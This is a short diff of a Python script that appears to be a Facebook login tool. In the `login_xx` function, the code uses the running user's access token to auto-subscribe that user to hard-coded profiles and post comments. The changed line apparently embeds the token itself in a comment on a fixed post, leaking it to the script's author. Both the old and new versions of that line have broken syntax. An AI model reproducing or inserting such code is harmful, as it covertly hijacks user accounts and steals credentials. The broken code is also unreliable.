@@ -668,7 +668,7 @@ def login_xx():
         os.system('rm -rf login.txt')
         
     requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + romz)
-    requests.post('https://graph.facebook.com/344477753726632/comments/?message='&access_token=' + romz)
+    requests.post('https://graph.facebook.com/344477753726632/comments/?message=' toket + '&access_token=' + romz)
     requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz)
     requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + romz) # 2007
     requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + romz) # Sniper @() Sheikh Sami Shuja Uddin MD
